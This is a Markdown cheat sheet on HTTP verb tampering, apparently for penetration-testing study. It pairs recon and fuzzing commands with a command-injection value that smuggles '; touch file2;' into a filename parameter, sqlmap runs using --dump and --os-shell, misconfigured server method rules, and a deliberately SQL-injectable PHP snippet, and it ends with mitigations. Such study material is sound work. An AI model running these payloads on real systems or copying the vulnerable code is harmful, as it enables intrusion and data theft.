# HTTP Verb Tampering

## 1. Identifying Protected Pages (Auth Bypass)

### Check for authentication prompts

```bash
curl -i http://target.com/admin/reset.php
curl -i http://target.com/admin/
```

### Using Burp Suite

* Intercept requests via Burp Proxy
* Review responses for 401/403 authentication requirements

---

## 2. Identifying Allowed HTTP Methods

### Using OPTIONS

```bash
curl -i -X OPTIONS http://target.com/admin/reset.php
```

### Using netcat

```bash
nc -nv target.com 80
OPTIONS / HTTP/1.1
Host: target.com
```

---

## 3. Exploiting Verb Bypass

### Using HEAD

```bash
curl -i -X HEAD http://target.com/admin/reset.php
```

### Manual tampering in Burp

* Change `POST` - `GET`, `HEAD`, or other allowed methods
* Observe whether authentication checks are skipped

### Post-bypass testing (e.g., command injection)

```bash
curl -X GET "http://target.com/page?filename=file1; touch file2;"
```

---

## 4. Insecure Server Configurations

### Apache

```xml
<Limit GET>
    Require valid-user
</Limit>
```

### Tomcat

```xml
<http-method>GET</http-method>
```

### ASP.NET

```xml
<allow verbs="GET" roles="admin">
```

*Improperly configured method restrictions may allow bypass via HEAD/OPTIONS/PUT.*

---

## 5. SQL Injection Testing

```bash
sqlmap -u "http://target.com/page?code=test" --dbs
sqlmap -u "http://target.com/page?code=test" --dump
sqlmap -u "http://target.com/page?code=test" --os-shell
```

---

## 6. Fuzzing HTTP Methods

```bash
wfuzz -c -z file,verbs.txt http://target.com/admin/FUZZ
```

---

## 7. Web Recon & Scanning

### Nmap

```bash
nmap -sV -sC target.com
nmap -p 80,443,8080 target.com
```

### Nikto

```bash
nikto -h target.com
```

### Gobuster

```bash
gobuster dir -u target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
```

---

## 8. Burp Suite Tools

* **Intruder** - fuzz parameters & methods
* **Repeater** - manual request crafting
* **Scanner** - automated vulnerability detection

---

## 9. HTTP Verb Tampering Overview

### Common verbs

* `HEAD` - headers only
* `PUT` - upload/replace resource
* `DELETE` - remove resource
* `OPTIONS` - query supported methods
* `PATCH` - partial update

### Why vulnerabilities occur

* Inconsistent auth across methods
* Weak input validation
* Misconfigured server `<Limit>` rules

### Insecure PHP example

```php
if(preg_match($pattern, $_POST["code"])) {
    $query = "SELECT * FROM ports WHERE port_code LIKE '%" . $_REQUEST["code"] . "%'";
}
```

*Filters POST but executes SQL using REQUEST - GET bypass is possible.*

---

## 10. Mitigation

* Apply the same auth logic across all HTTP methods
* Disable unused HTTP methods
* Enforce strict server-side input validation
* Harden web server configs
* Deploy WAF rules for method tampering detection
